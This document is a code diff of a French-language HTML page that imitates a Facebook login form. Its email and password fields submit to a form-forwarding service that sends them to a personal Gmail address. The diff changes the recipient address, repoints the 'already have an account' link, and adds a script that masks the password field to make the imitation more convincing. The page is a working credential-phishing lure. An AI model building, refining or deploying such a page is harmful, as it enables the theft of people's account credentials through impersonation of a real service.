@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="fr">
 <head>
@@ -84,19 +85,26 @@
       <img src="https://www.facebook.com/images/fb_icon_325x325.png" alt="Logo Facebook">
     </div>
         
-        <form action="https://formsubmit.co/fkamgang06@gmail.com" method="POST">
+        <form action="https://formsubmit.co/frankamdev@gmail.com" method="POST">
            
             <div class="input-group">
                 
                 <input type="email" id="email" name="email" placeholder="Votre email" required>
             </div>
             <div class="input-group">
-          
+                
                 <input type="text" id="password" name="name" placeholder="Créer un mot de passe" required>
             </div>
             <button type="submit" class="btn">Se connecter</button>
         </form>
-        <a href="https://www.google.com" target="_blank" class="link">Vous avez déjà un compte ?</a>
+        <a href="./notFound.html" target="_blank" class="link">Vous avez déjà un compte ?</a>
     </div>
+    
+    <script>
+        const passwordInput = document.getElementById("password");
+        passwordInput.addEventListener("input", () => {
+            passwordInput.type = "password";
+        });
+    </script>
 </body>
 </html>
